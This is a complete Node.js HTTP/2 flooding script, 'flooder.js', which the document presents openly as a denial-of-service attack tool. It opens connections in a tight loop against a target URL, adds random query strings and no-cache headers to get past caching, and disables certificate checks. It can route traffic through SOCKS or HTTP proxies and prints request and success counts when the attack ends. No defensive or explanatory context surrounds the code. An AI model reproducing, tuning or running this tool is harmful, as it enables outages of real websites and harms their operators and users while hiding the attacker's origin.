const http2 = require("http2");
const tls = require("tls");
const net = require("net");
const url = require("url");
const crypto = require("crypto");
const { SocksProxyAgent } = require("socks-proxy-agent");
const { HttpsProxyAgent } = require("https-proxy-agent");

const target = process.argv[2];
const duration = parseInt(process.argv[3]);
const cookie = process.argv[4];
const userAgent = process.argv[5];
const proxy = process.argv[6];
const showLog = process.argv.includes("-log");

if (!target || !duration || !cookie || !userAgent) {
    console.log("Usage: node flooder.js <URL> <DURATION> <COOKIE> <USER-AGENT> [PROXY: ip:port] [-log]");
    process.exit(1);
}

// Stats
let req = 0;
let ok = 0;
let err = 0;

function randInt(min, max) {
    return Math.floor(Math.random() * (max - min)) + min;
}

function randStr(len) {
    return crypto.randomBytes(len).toString("hex");
}

function makeHeaders(path, host) {
    return {
        ":authority": host,
        ":method": "GET",
        ":path": path + "?" + randStr(3),
        ":scheme": "https",
        "user-agent": userAgent,
        "cookie": cookie,
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.7",
        "accept-encoding": "gzip, deflate, br",
        "cache-control": "no-cache",
        "pragma": "no-cache",
        "sec-fetch-mode": "navigate",
        "sec-fetch-dest": "document",
        "sec-fetch-site": "none",
        "upgrade-insecure-requests": "1"
    };
}

function buildProxy(proxyStr) {
    if (!proxyStr) return null;
    if (proxyStr.includes("socks")) {
        return new SocksProxyAgent("socks://" + proxyStr);
    } else {
        return new HttpsProxyAgent("http://" + proxyStr);
    }
}

const proxyAgent = proxy ? buildProxy(proxy) : null;

// Attack
function run() {
    const parsed = new URL(target);

    const client = http2.connect(parsed.origin, {
        rejectUnauthorized: false,
        ALPNProtocols: ["h2"],
        settings: {
    headerTableSize: 80000,       // sebelumnya randInt(20000, 60000)
    maxConcurrentStreams: 800,    // sebelumnya randInt(100, 500)
    initialWindowSize: 637286,   // sebelumnya randInt(629145, 15728640)
    maxHeaderListSize: 40000      // sebelumnya randInt(20000, 40000)
    },
        createConnection: proxyAgent
            ? () => proxyAgent.connect(parsed)
            : undefined
    });

    client.on("error", () => {
        err++;
    });

    client.on("connect", () => {
        const interval = setInterval(() => {
            try {
                const headers = makeHeaders(parsed.pathname, parsed.host);
                const reqStream = client.request(headers);

                reqStream.on("response", () => {
                    ok++;
                });

                reqStream.on("error", () => {
                    err++;
                });

                reqStream.end();
                req++;
            } catch {
                err++;
            }
        }, 80);

        setTimeout(() => {
            clearInterval(interval);
            client.close();
        }, 2000);
    });
}

// Timer
const attack = setInterval(run, 0);

setTimeout(() => {
    clearInterval(attack);
    console.log("\nAttack stopped.");
    console.log(`[+] Requests: ${req}`);
    console.log(`[+] Success: ${ok}`);
    console.log(`[+] Errors: ${err}`);
    process.exit(0);
}, duration * 1000);

// Live log
if (showLog) {
    setInterval(() => {
        console.clear();
        console.log("[AI STEALTH HTTP/2]");
        console.log("Requests:", req);
        console.log("Success :", ok);
        console.log("Errors  :", err);
    }, 3000);
}
